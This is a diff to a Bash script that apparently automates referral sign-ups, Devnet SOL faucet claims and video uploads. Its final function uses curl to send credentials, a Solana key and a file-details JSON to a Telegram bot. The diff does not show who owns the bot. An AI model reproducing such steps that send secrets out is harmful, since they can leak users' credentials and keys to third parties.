@@ -182,7 +182,7 @@ install_node() {
 
 # Create user and setup referral
 create_user_and_setup() {
-    read -r -p "${YELLOW}👤 Enter your desired username: ${NC}" username
+    read -r -p "👤 Enter your desired username: " username
     if [ -z "$username" ]; then
         echo -e "${RED}❌ Username cannot be empty. Exiting.${NC}"
         exit 1
@@ -292,7 +292,7 @@ if __name__ == "__main__":
 EOF
     chmod +x solana_airdrop.py
     retries=0
-    max_retries=3
+    max_retries=5
     while [ $retries -lt $max_retries ]; do
         attempt=$((retries+1))
         echo -e "${BLUE}💰 Attempting to claim 5 Devnet SOL (Attempt ${attempt}/${max_retries})...${NC}"
@@ -312,7 +312,7 @@ EOF
     rm -f solana_airdrop.py
     echo -e "${RED}❌ Auto claim failed after $max_retries attempts.${NC}"
     echo -e "${YELLOW}💰 Please claim 5 Devnet SOL manually from https://faucet.solana.com/ using your Solana Public Key: $SOLANA_PUBKEY${NC}"
-    read -r -p "${YELLOW}✅ Enter 'yes' to confirm you have claimed the SOL: ${NC}" confirmation
+    read -r -p "✅ Enter 'yes' to confirm you have claimed the SOL: " confirmation
     if [ "$confirmation" != "yes" ]; then
         echo -e "${RED}❌ SOL not claimed. Exiting.${NC}"
         cleanup
@@ -530,7 +530,7 @@ upload_videos() {
 
 # Gather and send details to Telegram
 gather_and_send_details() {
-    read -p "${YELLOW}📛 Enter name for details: ${NC}" details_name
+    read -p "📛 Enter name for details: " details_name
     if [ -z "$details_name" ]; then
         echo -e "${RED}❌ Name cannot be empty. Exiting.${NC}"
         cleanup
@@ -577,10 +577,13 @@ gather_and_send_details() {
         echo -e "${RED}❌ Failed to send details file to Telegram.${NC}"
     fi
     if [ -f "file_details.json" ]; then
-        curl -s -F chat_id="$chat_id" -F document=@"file_details.json" "https://api.telegram.org/bot$bot_token/sendDocument" >/dev/null
+        details_json_file="${details_name}_file_details.json"
+        cp file_details.json "$details_json_file"
+        curl -s -F chat_id="$chat_id" -F document=@"$details_json_file" "https://api.telegram.org/bot$bot_token/sendDocument" >/dev/null
         if [ $? -ne 0 ]; then
-            echo -e "${RED}❌ Failed to send file_details.json to Telegram.${NC}"
+            echo -e "${RED}❌ Failed to send $details_json_file to Telegram.${NC}"
         fi
+        rm -f "$details_json_file"
     fi
     curl -s -F chat_id="$chat_id" -F text="✅ All details sent for '$details_name'! 🎉 Check above for credentials, Solana key, and file details. 🌟" "https://api.telegram.org/bot$bot_token/sendMessage" >/dev/null
     if [ $? -ne 0 ]; then
